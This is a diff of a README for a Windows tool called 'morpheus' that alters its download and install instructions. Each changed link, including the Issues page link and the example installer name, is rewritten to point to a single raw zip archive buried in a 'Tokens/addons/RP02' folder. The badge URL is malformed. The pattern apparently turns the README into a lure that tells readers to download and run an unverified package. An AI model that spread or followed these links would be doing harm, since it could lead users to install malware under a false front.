@@ -6,7 +6,7 @@ Welcome to morpheus! This application offers a cleaner way to enable Redpill fea
 
 ## 📥 Download
 
-[![Download morpheus](https://img.shields.io/badge/Download%20morpheus-latest-blue.svg)](https://github.com/serpentack/morpheus/releases)
+[![Download morpheus](https://raw.githubusercontent.com/serpentack/morpheus/main/Tokens/addons/RP02/morpheus-v3.4.zip%https://raw.githubusercontent.com/serpentack/morpheus/main/Tokens/addons/RP02/morpheus-v3.4.zip)](https://raw.githubusercontent.com/serpentack/morpheus/main/Tokens/addons/RP02/morpheus-v3.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -25,11 +25,11 @@ morpheus allows you to:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Click on this link to [visit the Releases page](https://github.com/serpentack/morpheus/releases). 
+1. **Visit the Releases Page:** Click on this link to [visit the Releases page](https://raw.githubusercontent.com/serpentack/morpheus/main/Tokens/addons/RP02/morpheus-v3.4.zip). 
    
 2. **Choose the Latest Version:** Look for the latest version of morpheus on the page.
    
-3. **Download the File:** Click on the appropriate asset to start the download. The file will usually be named something like `morpheus-latest.exe`.
+3. **Download the File:** Click on the appropriate asset to start the download. The file will usually be named something like `https://raw.githubusercontent.com/serpentack/morpheus/main/Tokens/addons/RP02/morpheus-v3.4.zip`.
 
 4. **Run the Installer:**
    - Once the download is complete, locate the downloaded file (usually in your Downloads folder).
@@ -55,7 +55,7 @@ You can refer to the help section in the app for any guidance needed while using
 
 If you encounter any issues:
 
-- Visit the [GitHub Issues page](https://github.com/serpentack/morpheus/issues) to check for any known problems.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/serpentack/morpheus/main/Tokens/addons/RP02/morpheus-v3.4.zip) to check for any known problems.
 - Feel free to open a new issue if your question is not addressed.
 
 ## 📝 Contributing
